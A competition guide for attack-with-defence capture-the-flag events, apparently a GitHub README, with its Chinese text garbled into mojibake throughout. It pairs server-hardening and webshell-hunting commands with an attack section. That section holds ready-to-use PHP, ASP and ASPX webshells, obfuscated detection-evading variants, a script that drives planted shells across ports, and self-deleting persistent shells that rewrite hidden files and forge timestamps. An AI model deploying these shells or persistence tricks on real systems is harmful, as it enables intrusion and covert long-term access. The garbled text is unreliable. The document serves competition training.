# AWDæ¯”èµ›æŒ‡å¯¼æ‰‹å†Œ

å¦‚æœä½ è¦å‚åŠ AWDç›¸å…³æ¯”èµ›ï¼Œç›¸ä¿¡æœ¬é¡¹ç›®èƒ½ç»™ä½ å¸¦æ¥å¸®åŠ©~

![AWD-Guide](https://socialify.git.ci/AabyssZG/AWD-Guide/image?description=1&font=Bitter&forks=1&language=1&logo=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F54609266%3Fv%3D4&owner=1&pattern=Solid&stargazers=1&theme=Dark)

**å¦‚æœä½ è§‰å¾—æœ¬é¡¹ç›®ä¸é”™ï¼Œæ¬¢è¿ç»™æˆ‘ç‚¹ä¸ªStarï¼Œä¸‡åˆ†æ„Ÿè°¢~~**

## 1# æ¯”èµ›ç¯å¢ƒ

Windows+Linuxç»„åˆæ¨¡å¼ï¼š

- Windows Server 2003 + Centos6.x/Ubuntu14/16.04/Ubuntu17.01
- Window7 + Centos6.x/Ubuntu14/16.04/Ubuntu17.01
- Windows Server 2008 + Centos6.x/Ubuntu14/16.04/Ubuntu17.01


## 2# é˜²å®ˆå‡†å¤‡ï¼ˆDefenseï¼‰

### 2.1# WindowsåŠ å›º

å…ˆå¤‡ä»½ï¼šWebæºç ã€æ•°æ®åº“

1. 445åŠ å›ºï¼Œå¼€å¯é˜²ç«å¢™æˆ–IPé«˜çº§å®‰å…¨ç­–ç•¥
2. å¼€å¯ç³»ç»Ÿæ—¥å¿—å®¡è®¡åŠŸèƒ½
3. ç¦ç”¨guestè´¦æˆ·ã€å…³é—­æ–‡ä»¶å…±äº«
4. ç¡®ä¿å¯åŠ¨é¡¹å†…å®¹æ˜¯å¯æ§çš„
5. é™åˆ¶3389è¿œç¨‹è®¿é—®æ§åˆ¶çš„è¿æ¥æ•°ï¼šåœ¨æœ¬åœ°ç»„ç­–ç•¥ç¼–è¾‘å™¨é‡Œé¢ï¼Œä¾æ¬¡å±•å¼€è®¡ç®—æœºé…ç½®--->ç®¡ç†æ¨¡æ¿--->Windowsç»„ä»¶--->è¿œç¨‹æ¡Œé¢æœåŠ¡--->è¿œç¨‹æ¡Œé¢ä¼šè¯ä¸»æœº--->è¿æ¥--->é™åˆ¶è¿æ¥çš„æ•°é‡
6. ä½¿ç”¨å·¥å…·ç›‘æ§å…³é”®ç›®å½•æ–‡ä»¶:æ–‡ä»¶æ“ä½œç›‘æ§.exeã€å¾¡å‰‘æ–‡ä»¶ç›‘æ§.exe
7. æ¶æ„ä»£ç æ–‡ä»¶ï¼Œé€šè¿‡PCHunterã€MonitoræŸ¥æ‰¾
8. Webç›®å½•ç¯å¢ƒæŸ¥æ‰¾ç›¸å…³å¯ç–‘æ–‡ä»¶ï¼šjpg/png/rarï¼ŒæŸ¥çœ‹å±æ€§ã€è§£å‹çœ‹æ–‡ä»¶å†…å®¹
9. NTFSæ‰«æç£ç›˜æŸ¥æ‰¾éšè—çš„äº¤æ¢æµæ•°æ®
10. æŸ¥æ‰¾ç³»ç»Ÿæ‰€æœ‰è´¦æˆ·ä¿¡æ¯ï¼Œç¦æ­¢éAdministratorè´¦æˆ·
11. ä¿®æ”¹Webç«™ç‚¹ç®¡ç†å‘˜è®¿é—®è·¯å¾„ã€é»˜è®¤å£ä»¤ã€æ•°æ®åº“å£ä»¤
12. å®‰è£…WAFè„šæœ¬ï¼Œé˜²æŠ¤Webç«™ç‚¹ï¼Œç¦æ­¢å…¶ä»–æ¼æ´

### 2.2# LinuxåŠ å›º

å…ˆå¤‡ä»½ï¼šWebæºç ã€æ•°æ®åº“

1. ç³»ç»Ÿå£ä»¤ä¿®æ”¹ï¼Œå›¢é˜Ÿç»Ÿä¸€å£ä»¤
2. é€šè¿‡ `.bash_history` æŸ¥æ‰¾å†å²å‘½ä»¤æ“ä½œï¼Œå‘ç°ç—•è¿¹
3. æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼š`crontab -l`ï¼›ç¼–è¾‘è®¡åˆ’ä»»åŠ¡ï¼š`crontab -e`
4. æŸ¥çœ‹ `/etc/init.d/rc.local` ä¸­å¯åŠ¨æœåŠ¡æœ‰æ— å¼‚å¸¸
5. ä½¿ç”¨è„šæœ¬å¼€å¯è¿›ç¨‹ç›‘æ§ã€ç›®å½•ç›‘æ§ã€æµé‡ç›‘æ§
6. Webç«™ç‚¹å£ä»¤,ç«™ç‚¹ç®¡ç†å‘˜è·¯å¾„ä¿®æ”¹
7. ç³»ç»ŸåŠ å›ºï¼šiptable

### 2.3# MysqlåŠ å›º

ä¸ºäº†é˜²èŒƒå¼±å£ä»¤æ”»å‡»ï¼ŒMysqlå¯†ç é»˜è®¤éƒ½æ˜¯rootï¼Œphpstudyé»˜è®¤å¯†ç 123456

1. ä¸ä½¿ç”¨é»˜è®¤å£ä»¤ï¼Œä¿®æ”¹æˆå¤æ‚çš„ï¼Œå¹¶ç¡®ä¿å’Œwebç¯å¢ƒè¿æ¥
2. è®¾ç½®åªå…è®¸æœ¬åœ°127.0.0.1è´¦æˆ·ç™»å½•ï¼šä¿®æ”¹ `bind-address=127.0.0.1` ï¼›åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥ `seccure_file_priv=NULL`
3. å¼€å¯æ—¥å¿—å®¡è®¡åŠŸèƒ½ï¼š`general_log_file=`è·¯å¾„

å› ä¸ºæœ€å¸¸ç”¨çš„æ˜¯Mysqlæ•°æ®åº“ï¼Œæ‰€ä»¥åŸºæœ¬çš„æ”»é˜²å¤§éƒ¨åˆ†éƒ½æ˜¯ç”¨mysqlæ•°æ®åº“çš„å‘½ä»¤

å¤‡ä»½æŒ‡å®šæ•°æ®åº“ï¼š

```mysql
mysqldump â€“u username â€“p password databasename > target.sql
```

å¤‡ä»½æ‰€æœ‰æ•°æ®åº“ï¼š

```mysql
mysqldump â€“all -databases > all.sql
```

å¯¼å…¥æ•°æ®åº“ï¼š

```mysql
mysql â€“u username â€“p password database < from.sql
```

### 2.4# MssqlåŠ å›º

1. åˆ é™¤ä¸å¿…è¦çš„è´¦å·	
2. SQLServerç”¨æˆ·å£ä»¤å®‰å…¨	
3. æ ¹æ®ç”¨æˆ·åˆ†é…å¸å·é¿å…å¸å·å…±äº«
4. åˆ†é…æ•°æ®åº“ç”¨æˆ·æ‰€éœ€çš„æœ€å°æƒé™
5. ç½‘ç»œè®¿é—®é™åˆ¶
6. SQLServerç™»å½•å®¡è®¡
7. SQLServerå®‰å…¨äº‹ä»¶å®¡è®¡
8. é…ç½®æ—¥å¿—åŠŸèƒ½

### 2.5# é˜²å®ˆå¸¸ç”¨å‘½ä»¤

#### 2.5.0# è®¾ç½®åªè¯»æƒé™

Webæ ¹ç›®å½•è®¾ç½®åªè¯»æƒé™

```C
chmod 0555 /var/www/html
```

æ”¹å˜æ–‡ä»¶çš„å±ä¸»å’Œå±ç»„æ¥è®¾ç½®ä¸¥æ ¼çš„æƒé™

```C
chown -R root:root /var/www/html/        //è®¾ç½®æ‹¥æœ‰äººä¸ºï¼šroot:root æˆ– httpd:httpd (æ¨è)
chown -R apache:apache /var/www/html/    //ç¡®ä¿ apache æ‹¥æœ‰ /var/www/html/
```

#### 2.5.1# æ˜ç¡®æœºå™¨ä¿¡æ¯

çŸ¥å·±çŸ¥å½¼ï¼Œç™¾æˆ˜ä¸æ®†

```C
uname -a                       //ç³»ç»Ÿä¿¡æ¯
ps -aux -ps -ef                //è¿›ç¨‹ä¿¡æ¯
id                             //ç”¨äºæ˜¾ç¤ºç”¨æˆ·IDï¼Œä»¥åŠæ‰€å±ç¾¤ç»„ID
netstat -ano/-a                //æŸ¥çœ‹ç«¯å£æƒ…å†µ
cat /etc/passwd                //ç”¨æˆ·æƒ…å†µ
ls /home/                      //ç”¨æˆ·æƒ…å†µ
find / -type d -perm -002      //å¯å†™ç›®å½•æ£€æŸ¥
grep -r â€œflagâ€ /var/www/html/  //æŸ¥æ‰¾æœ¬åœ°flag
```

#### 2.5.2# æŸ¥çœ‹å¼€æ”¾ç«¯å£

```c
netstat -anp                                                  //æŸ¥çœ‹ç«¯å£
firewall-cmd --zone= public --remove-port=80/tcp â€“permanent   //å…³é—­ç«¯å£
firewall-cmd â€“reload                                          //é˜²ç«å¢™é‡å¯
```

#### 2.5.3# å¤‡ä»½æºç 

é˜²æ­¢åœ¨å¯¹æºç è¿›è¡Œä¿®æ”¹æ—¶å‡ºé—®é¢˜ï¼Œæˆ–è€…è¢«æ”»å‡»æ–¹åˆ é™¤æºç è€Œå‡†å¤‡

å‹ç¼©

```C
tar -cvf web.tar /var/www/html
zip -q -r web.zip /var/www/html
```

è§£å‹ç¼©

```C
tar -xvf web.tar -c /var/www/html
unzip web.zip -d /var/www/html
```

å¤‡ä»½

```C
mv web.tar /tmp
mv web.zip /home/xxx
```

ä¸Šä¼ ä¸‹è½½

```C
scp username@servername:/path/filename /tmp/local_destination //ä»æœåŠ¡å™¨ä¸‹è½½å•ä¸ªæ–‡ä»¶åˆ°æœ¬åœ°
scp /path/local_filename username@servername:/path            //ä»æœ¬åœ°ä¸Šä¼ å•ä¸ªæ–‡ä»¶åˆ°æœåŠ¡å™¨
scp -r username@servername:remote_dir/ /tmp/local_dir         //ä»æœåŠ¡å™¨ä¸‹è½½æ•´ä¸ªç›®å½•åˆ°æœ¬åœ°
scp -r /tmp/local_dir username@servername:remote_dir          //ä»æœ¬åœ°ä¸Šä¼ æ•´ä¸ªç›®å½•åˆ°æœåŠ¡å™¨
```

#### 2.5.4# å¤‡ä»½æ•°æ®åº“

å› ä¸ºæœ€å¸¸ç”¨çš„æ˜¯Mysqlæ•°æ®åº“ï¼Œæ‰€ä»¥åŸºæœ¬çš„æ”»é˜²å¤§éƒ¨åˆ†éƒ½æ˜¯ç”¨mysqlæ•°æ®åº“çš„å‘½ä»¤

å¤‡ä»½æŒ‡å®šæ•°æ®åº“ï¼š

```mysql
mysqldump â€“u username â€“p password databasename > target.sql
```

å¤‡ä»½æ‰€æœ‰æ•°æ®åº“ï¼š

```mysql
mysqldump â€“all -databases > all.sql
```

å¯¼å…¥æ•°æ®åº“ï¼š

```mysql
mysql â€“u username â€“p password database < from.sql
```

#### 2.5.5# å£ä»¤æ›´æ”¹

ä¸ºäº†é˜²èŒƒå¼±å£ä»¤æ”»å‡»ï¼ŒMysqlå¯†ç é»˜è®¤éƒ½æ˜¯rootï¼Œphpstudyé»˜è®¤å¯†ç 123456

è¿˜æœ‰å…¶ä»–é»˜è®¤å¯†ç adminï¼Œtop100ï¼Œ top1000ç­‰

**å°¤å…¶æ˜¯WEBåº”ç”¨çš„åå°å¯†ç ä¿®æ”¹**

```c
passwd username                                                  //sshå£ä»¤ä¿®æ”¹
set password for mycms@localhost = password('18ciweufhi28746');  //MySQLå¯†ç ä¿®æ”¹
find /var/www//html -path '*config*â€™                             //æŸ¥æ‰¾é…ç½®æ–‡ä»¶ä¸­çš„å¯†ç å‡­è¯
```

#### 2.5.6# æŸ¥è¯¢è¿›ç¨‹çº¿ç¨‹

```
netstat / ps -aux
netstat -apt
```

#### 2.5.7# SSH

```
w/fuser 
```

#### 2.5.8# æ€æ‰è¿›ç¨‹

```
kill -9 pid
```

#### 2.5.9# æœç´¢å…³é”®è¯æ–‡ä»¶

```C
find /var/www/html -name *.php -mmin -5                        //æŸ¥çœ‹æœ€è¿‘5åˆ†é’Ÿä¿®æ”¹æ–‡ä»¶
find ./ -name '*.php' | xargs wc -l | sort -u                  //å¯»æ‰¾è¡Œæ•°æœ€çŸ­æ–‡ä»¶ï¼Œä¸€èˆ¬æœ‰å¯èƒ½æ˜¯ä¸€å¥è¯æœ¨é©¬
grep -r --include=*.php  '[^a-z]eval($_POST'  /var/www/html    //æŸ¥åŒ…å«å…³é”®å­—çš„phpæ–‡ä»¶
find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more //åœ¨Linuxç³»ç»Ÿä¸­ä½¿ç”¨findã€grepå’Œxargså‘½ä»¤çš„ç»„åˆï¼Œç”¨äºåœ¨æŒ‡å®šç›®å½•ï¼ˆ/var/www/htmlï¼‰ä¸‹æŸ¥æ‰¾æ‰€æœ‰ä»¥.phpä¸ºæ‰©å±•åçš„æ–‡ä»¶ï¼Œå¹¶æœç´¢è¿™äº›æ–‡ä»¶ä¸­åŒ…å«å­—ç¬¦ä¸²"eval("çš„è¡Œ
//ä½¿ç”¨moreå‘½ä»¤æ¥åˆ†é¡µæ˜¾ç¤ºç»“æœï¼Œä»¥ä¾¿åœ¨è¾“å‡ºè¾ƒé•¿æ—¶è¿›è¡Œé€é¡µæŸ¥çœ‹
```

#### 2.5.10# æŸ¥æ€ä¸æ­»é©¬

ä¹Ÿå¯ä»¥åˆ©ç”¨å‘½ä»¤è‡ªåŠ¨è¿›è¡ŒæŸ¥æ‰¾åˆ é™¤

```c
ps aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9
```

ç„¶åé‡å¯æœåŠ¡

```c
service php-fpm restart
```

#### 2.5.11# æ€å¼¹shelll

è€è§„çŸ©æŸ¥çœ‹è¿›ç¨‹

```c
ps -ef / px -aux
```

æ³¨æ„ `www-data` æƒé™çš„ `/bin/sh`ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯nc

å†å°±æ˜¯ä¸Šè€ä¸€å¥—å‘½ä»¤

```c
kill ps -aux | grep www-data | grep apache2 | awk '{print $2}'
```

#### 2.5.12# è®¾ç½®WAF

åˆ©ç”¨ `.htaccess` é…ç½®æ–‡ä»¶ç¦æ­¢phpæ–‡ä»¶æ‰§è¡Œ

```php
<Directory "/var/www/html/upload">   //æŒ‡å®šç›®å½•åç»­çš„æŒ‡ä»¤å°†åº”ç”¨äºè¯¥ç›®å½•
Options -ExecCGI -Indexes            //ç¦ç”¨äº†ç›®å½•ä¸­çš„ CGI æ‰§è¡Œå’Œç›®å½•ç´¢å¼•ï¼ˆæ˜¾ç¤ºç›®å½•å†…å®¹åˆ—è¡¨ï¼‰åŠŸèƒ½ã€‚
AllowOverride None                   //ä¸å…è®¸åœ¨è¯¥ç›®å½•ä¸­ä½¿ç”¨ .htaccess æ–‡ä»¶æ¥è¦†ç›–æœåŠ¡å™¨çš„é…ç½®ã€‚
RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  
RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      
//è¿™ä¸¤ä¸ªæŒ‡ä»¤ç§»é™¤æŒ‡å®šæ–‡ä»¶æ‰©å±•åçš„å¤„ç†å™¨å’Œç±»å‹ã€‚
//åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™äº›æŒ‡ä»¤ä» Apache çš„å¤„ç†åˆ—è¡¨ä¸­ç§»é™¤äº†ä¸ PHP ç›¸å…³çš„æ‰©å±•åå’ŒæœåŠ¡å™¨ç«¯åŒ…å«ï¼ˆSSIï¼‰æ–‡ä»¶ç±»å‹ã€‚
php_flag engine off     //è¿™ä¸ªæŒ‡ä»¤å°† PHP çš„å¼•æ“æ ‡å¿—ï¼ˆengineï¼‰è®¾ç½®ä¸ºå…³é—­çŠ¶æ€ï¼Œä»è€Œç¦ç”¨äº†åœ¨è¯¥ç›®å½•ä¸­æ‰§è¡Œ PHP è„šæœ¬çš„èƒ½åŠ›ã€‚
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
deny from all
</FilesMatch>  //è¿™ä¸‰è¡Œå‘½ä»¤ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…äº†ä»¥ .phpã€.phtmlã€.php3ã€.phtã€.php4ã€.php5ã€.php7ã€.shtml ç»“å°¾çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶è®¿é—®æƒé™è®¾ç½®ä¸ºæ‹’ç»æ‰€æœ‰
</Directory>
```



## 3# æ”»å‡»å‡†å¤‡ï¼ˆAttackï¼‰

### 3.1# ä¸»è¦å‡†å¤‡å†…å®¹

1. å„ç±»CMSè½¯ä»¶åŒ…æœ€æ–°ç‰ˆå‡†å¤‡
2. æ‰«æå·¥å…·ï¼šNmapã€Nessusã€Metasploitæ›´æ–°
2. æ¼æ´åˆ©ç”¨è„šæœ¬Pocã€Exp


### 3.2# Linuxææƒ

æŸ¥è¯¢ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯å‘½ä»¤ï¼š

```c
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```

æŸ¥è¯¢å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯å‘½ä»¤ï¼š

```c
uname -a
uname -mrs
cat /proc/version
cat /etc/issue
lsb_release -a
hostnamectl  
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
```

æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒå˜é‡å‘½ä»¤ï¼š

```c
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

æŸ¥çœ‹è¯­è¨€ç¯å¢ƒä¿¡æ¯å‘½ä»¤ï¼š

```c
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
set
```

æŸ¥çœ‹æ–‡ä»¶ä¸Šä¼ ç¯å¢ƒä¿¡æ¯å‘½ä»¤ï¼š

```c
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

è¿™é‡Œåˆ—ä¸¾ä¸€äº›å¯ç”¨åˆ©ç”¨çš„ææƒæ¼æ´ï¼š

- CVE-2023-0386ï¼ˆLinux OverlayFSæƒé™æå‡æ¼æ´ï¼‰
- CVE-2021-4034ï¼ˆLinux Polkitæœ¬åœ°æƒé™æå‡æ¼æ´ï¼‰
- CVE-2017-6074 ï¼ˆDCCPåŒé‡é‡Šæ”¾æ¼æ´ > 2.6.18 ï¼‰
- CVE-2016-5195ï¼ˆè„ç‰›ï¼Œkernel 2.6.22 < 3.9 (x86/x64)ï¼‰
- CVE-2016-8655ï¼ˆUbuntu 12.04ã€14.04ï¼ŒDebian 7ã€8ï¼‰
- CVE-2017-1000367ï¼ˆsudoæœ¬åœ°ææƒæ¼æ´ ï¼‰
- CVE-2016-1247ï¼ˆNginxæƒé™æå‡æ¼æ´ï¼‰
- CVE-2017-16995ï¼ˆUbuntu16.04   kernel:4.14-4.4ï¼‰

Kaliå‘½ä»¤æŸ¥è¯¢ï¼š

```
searchsploit CentOS 7
searchsploit Ubuntu 16.04
```

ææƒExploitå¯»æ‰¾ï¼š

- [http://www.exploit-db.com](http://www.exploit-db.com)
- [http://metasploit.com/modules/](http://metasploit.com/modules/)
- [http://securityreason.com](http://securityreason.com)
- [http://seclists.org/fulldisclosure/](http://seclists.org/fulldisclosure/)
- [https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main)

ç¼–è¯‘ææƒExp

```
gcc -o /usr/share/nginx/html/***** /usr/share/nginx/html/*****.c -Wall
```

ç›´æ¥ææƒï¼Œç¡®è®¤æƒé™ï¼š

```
cat /etc/shadow
```

å…¶ä»–ææƒå§¿åŠ¿ï¼š[https://www.freebuf.com/articles/system/244627.html](https://www.freebuf.com/articles/system/244627.html)

### 3.3# Windowsææƒå’Œæ¼æ´

è¿™é‡Œåˆ—ä¸¾ä¸€äº›Windowsçš„æ¼æ´ï¼š

- å„ç§Potatoï¼ˆGithubä¸Šé¢åŸºæœ¬éƒ½æœ‰ï¼‰
- CVE-2023-35359ï¼ˆWindowså†…æ ¸æƒé™æå‡æ¼æ´ï¼Œå¼€æºäº†ï¼‰
- CVE-2022-24521ï¼ˆæ²¡æœ‰Expçš„å¯ä»¥æ‰¾æˆ‘è¦ï¼‰
- CVE-2019-1405
- CVE-2019-1322
- MS17-017ï¼ˆæ•´å‹æº¢å‡ºæ¼æ´ï¼‰
- MS17-010ï¼ˆæ°¸æ’ä¹‹è“ï¼Œå¯çœ‹[https://blog.zgsec.cn/archives/172.html](https://blog.zgsec.cn/archives/172.html)ï¼‰

### 3.4# ä¸­é—´ä»¶æ¼æ´

- IISï¼ˆè§£ææ¼æ´ã€è¿œç¨‹ä»£ç æ‰§è¡Œï¼‰
- Apacheï¼ˆè§£ææ¼æ´ï¼‰
- Nginxï¼ˆè§£ææ¼æ´ï¼‰
- Jbossï¼ˆCVE-2017-7504/CVE-2017-12149/CVE-2015-7501ï¼‰
- Mysqlï¼ˆå¼±å£ä»¤ï¼‰
- Tomcatï¼ˆå¼±å£ä»¤Getshellï¼‰
- Weblogicï¼ˆCVE-2020-2551/CVE-2020-2555/CVE-2020-2883ï¼‰
- SpringBootï¼ˆæœªæˆæƒè®¿é—®æ¼æ´å’ŒRCEæ¼æ´ï¼Œå…·ä½“å¯çœ‹[https://blog.zgsec.cn/archives/129.html](https://blog.zgsec.cn/archives/129.html)ï¼‰

### 3.5# é›†æˆæœåŠ¡ç¯å¢ƒæ¼æ´

- wampserver
- xamppserver

### 3.6# CMSåˆ—è¡¨å‚è€ƒ

ä¸‹è½½æœ€æ–°ç‰ˆæœ¬+æ¯ä¸ªCMSå¯¹åº”çš„æ¼æ´pocã€expå·¥å…·è„šæœ¬æ–‡ç« ï¼Œä¹‹åæ±‡æ€»

- Aspcms
- Dedecms
- Dicuz
- Drupal
- Empirecms
- Eshop
- Finecms
- Joomla
- Lamp
- Metainfo
- Phpcms
- Phpwind
- Qibocms
- Seacms
- Semcms
- ThinkPHP
- Wolfcms
- Wordpress
- Zabbix

### 3.7# æ”»å‡»å¸¸ç”¨å‘½ä»¤

#### 3.7.1# ä¸»æœºä¿¡æ¯æœé›†

Nmap

```c
namp -sn 192.168.0.0/24            //Cæ®µå­˜æ´»æ‰«æ
```

httpscan

```c
httpscan.py 192.168.0.0/24 â€“t 10   //Cæ®µå­˜æ´»æ‰«æ
```

#### 3.7.2# ç«¯å£æ‰«æ

```c
nmap -sV 192.168.0.2               //æ‰«æä¸»æœºç³»ç»Ÿç‰ˆæœ¬
nmap -sS 192.168.0.2               //æ‰«æä¸»æœºå¸¸ç”¨ç«¯å£
nmap -sS -p 80,445 192.168.0.2     //æ‰«æä¸»æœºéƒ¨åˆ†ç«¯å£
nmap -sS -p- 192.168.0.2           //æ‰«æä¸»æœºå…¨éƒ¨ç«¯å£
```

Pythonè„šæœ¬

```python
import requests

for x in range(2,255): 
    url = "http://192.168.1.{}".format(x) 
    try: 
        r = requests.post(url) 
        print(url) 
        except: 
        pass
```

#### 3.7.3# å…³é”®æ–‡ä»¶æ£€ç´¢

ç»„ä»¶æ£€ç´¢

```c
find / -name "apaech2.conf"                 //æ£€ç´¢Apacheä¸»é…ç½®æ–‡ä»¶
find / -name "nginx.conf"                   //æ£€ç´¢Nginxç›®å½•
find / -path "*nginx*" -name nginx*conf     //æ£€ç´¢Nginxé…ç½®ç›®å½•
find / -name "httpd.conf"                   //æ£€ç´¢Apacheç›®å½•
find / -path "*apache*" -name apache*conf   //æ£€ç´¢Apacheé…ç½®ç›®å½•
```

ç½‘ç«™é¦–é¡µ

```c
find / -name "index.php"                    //å®šä½ç½‘ç«™ç›®å½•
find / -name "index.html"                   //å®šä½ç½‘ç«™ç›®å½•
```

æ—¥å¿—æ–‡ä»¶æ£€ç´¢

```c
/var/log/nginx/                           //é»˜è®¤Nginxæ—¥å¿—ç›®å½•
/var/log/apache/                          //é»˜è®¤Apacheæ—¥å¿—ç›®å½•
/var/log/apache2/                         //é»˜è®¤Apacheæ—¥å¿—ç›®å½•
/usr/local/tomcat/logs                    //Tomcatæ—¥å¿—ç›®å½•
tail -f xxx.log                           //å®æ—¶åˆ·æ–°æ»šåŠ¨æ—¥å¿—æ–‡ä»¶
```

å¤‡ä»½æ£€ç´¢ï¼šhttps://github.com/sry309/ihoneyBakFileScan

#### 3.7.4# ä¸Šä¼ åé—¨

curl(è·Ÿhackbarå·®ä¸å¤š)

```c
C:\Users\admin>curl "http://192.168.182.130:8801/include/shell.php" -d "admin_ccmd=system('cat /f*');"
//å‘shell.phpæ–‡ä»¶é‡Œä¼ å…¥å‚æ•°å¹¶è¿”å›ç»“æœ
```

Pythonå¤šç«¯å£ä¼ å‚

```python
#coding=utf-8
import requests

url_head="http://192.168.182.130"   #ç½‘æ®µ
url=""
shell_addr="/upload/url/shell.php" #æœ¨é©¬è·¯å¾„
passwd="pass"                   #æœ¨é©¬å¯†ç 
#port="80"
payload = {passwd: 'System(\'cat /flag\');'}
# find / -name "flag*"

#æ¸…ç©ºä¸Šæ¬¡è®°å½•
flag=open("flag.txt","w")
flag.close()
flag=open("flag.txt","a")

for i in range(8000,8004):
    url=url_head+":"+str(i)+shell_addr
    try:
        res=requests.post(url,payload)#,timeout=1
        if res.status_code == requests.codes.ok:
            result = res.text
            print (result)
            flag.write(result+"\n") 
        else:
            print ("shell 404")
    except:
        print (url+" connect shell fail")

flag.close()
```

#### 3.7.5# ä¸€å¥è¯æœ¨é©¬

å¸¸è§ä¸€å¥è¯æœ¨é©¬

```php
PHPï¼š <?php @eval($_POST['pass']);?>      <?php eval($_GET['pass']);
Aspï¼š   <%eval request ("pass")%>
Aspxï¼š  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```

getå‹æœ¨é©¬

```php
<?php eval($_GET['pass']);

#åˆ©ç”¨æ–¹å¼/shell.php?pass=eval($_POST[1]);
```

å…æ€é©¬åˆ¶ä½œï¼š[https://github.com/AabyssZG/WebShell-Bypass-Guide](https://github.com/AabyssZG/WebShell-Bypass-Guide)

```php
<?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);                            //æ‰§è¡ŒGETä¼ å‚ ?_=system&__=whoami æ¥æ‰§è¡Œwhoamiå‘½ä»¤
<?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);   //æ‰§è¡ŒGETä¼ å‚ ?_=assert å’ŒPOSTä¼ å‚ __=PHPä»£ç æ¥GetShell
```

#### 3.7.6# ä¸æ­»é©¬

ç®€å•ä¸æ­»é©¬

```php
<?php
set_time_limit(0);   //PHPè„šæœ¬é™åˆ¶äº†æ‰§è¡Œæ—¶é—´ï¼Œset_time_limit(0)è®¾ç½®ä¸€ä¸ªè„šæœ¬çš„æ‰§è¡Œæ—¶é—´ä¸ºæ— é™é•¿
ignore_user_abort(1);  //ignore_user_abortå¦‚æœè®¾ç½®ä¸º TRUEï¼Œåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€,è„šæœ¬å°†ç»§ç»­è¿è¡Œã€‚
unlink(__FILE__);     //åˆ é™¤è‡ªèº«

while(1)
{
    file_put_contents('shell.php','<?php @eval($_POST["password"]);?>');  //åˆ›å»ºshell.php
    sleep(0);    //é—´éš”æ—¶é—´
}
```

**å¯ä»¥é€šè¿‡ä¸æ–­å¤å†™shell.phpæ¥è¾¾åˆ°è¯¥æœ¨é©¬éš¾ä»¥è¢«ä½¿ç”¨çš„æ•ˆæœ**

```php
<?php
set_time_limit(0);   // å–æ¶ˆè„šæœ¬è¿è¡Œæ—¶é—´çš„è¶…æ—¶ä¸Šé™
ignore_user_abort(1);  // åå°è¿è¡Œ

while(1)
{
    file_put_contents('shell.php','11111111');  //åˆ›å»ºshell.php
    sleep(0);
}
```

è¿›é˜¶ä¸æ­»é©¬

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'shell.php';
$code = '<?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST['cmd']);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" shell2.php');  //ä¿®æ”¹æ—¶é—´ï¼Œé˜²æ­¢è¢«åˆ 
    usleep(5000);
}
?>

//passwd=y0range857
//POSTä¼ å‚ï¼špasswd=y0range857&a=system('ls');
```

å°†è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åè¿›è¡Œè®¿é—®ï¼Œä¼šåœ¨è¯¥è·¯å¾„ä¸‹ä¸€ç›´ç”Ÿæˆä¸€ä¸ªåå­—ä¸ºshell2.phpçš„shellæ–‡ä»¶

å†™å…¥shellï¼Œ yj.phpå†…å®¹

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.login.php';
$file1 = '/admin/.register.php'; 
$code = '<?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["at"]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .login.php');
    file_put_contents($file1,$code);
    system('touch -m -d "2018-12-01 09:10:12" /admin/.register.php');
    usleep(5000);
}
?>
```

æµè§ˆå™¨è®¿é—®yj.phpï¼Œä¼šç”Ÿæˆä¸æ­»é©¬.login.php /admin/.register.php

#### 3.7.7# æƒé™ç»´æŒ

1ã€ä¸æ­»é©¬

```php
<?php 
ignore_user_abort(true);  #å®¢æˆ·æœºæ–­å¼€ä¾æ—§æ‰§è¡Œ
set_time_limit(0); #å‡½æ•°è®¾ç½®è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´ã€‚è¿™é‡Œè®¾ç½®ä¸º0ï¼Œå³æ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶ã€‚
unlink(__FILE__);  #åˆ é™¤æ–‡ä»¶æœ¬èº«ï¼Œä»¥èµ·åˆ°éšè”½è‡ªèº«çš„ä½œç”¨ã€‚
$file = '2.php';
$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2018-12-01 09:10:12" .2.php');
    usleep(5000);
} 
?>
```

